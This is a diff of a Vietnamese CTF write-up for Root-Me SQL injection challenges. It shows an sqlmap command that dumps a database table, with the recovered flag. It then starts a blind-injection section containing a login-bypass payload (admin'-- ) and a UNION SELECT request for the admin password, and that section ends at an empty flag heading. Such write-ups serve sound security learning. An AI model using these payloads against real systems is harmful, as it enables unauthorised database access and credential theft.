@@ -136,9 +136,27 @@ Gõ lệnh: `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?acti
 ![Screenshot 2023-11-05 204559](https://github.com/aQ05/Write-up/assets/121664384/b1aa43ab-37e9-4fe4-9c57-728854912f59)
 
 Ta có 1 bảng là `m3mbr35t4bl3`. Thực hiện lấy data trong bảng. Gõ lệnh: `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`
+(`T` là bảng cần lấy dữ liệu, `--dump` để lấy toàn bộ dữ liệu).
+
 ![Screenshot 2023-11-05 204707](https://github.com/aQ05/Write-up/assets/121664384/6f2714ff-2dca-4b0a-bd3f-f4fd33b7d4f8)
 
 ## Flag
 `1a2BdKT5DIx3qxQN3UaC`
+
+# SQL injection - Blind
+Authentication v 0.02
+
+**Statement:** Retrieve the administrator password.
+
+## Cách làm
+Truy cập link http://challenge01.root-me.org/web-serveur/ch10/. Giao diện hiện ra chức năng đăng nhập. Thử payload với username `admin’-- ` và password tùy ý. Tuy nhiên website không trả về bất kỳ thông tin về password nào cả.
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/40b751f2-59f2-4cd7-8793-daba5f376695)
+
+Mở burpsuite thử thay đổi payload bằng cách sử dụng `union select`. Dùng lệnh `username=admin%27+union+select+password+from+users+where+username='admin'--+-&password=1` và trang web vẫn không có gì thay đổi.
+
+
+## Flag
+
 
 
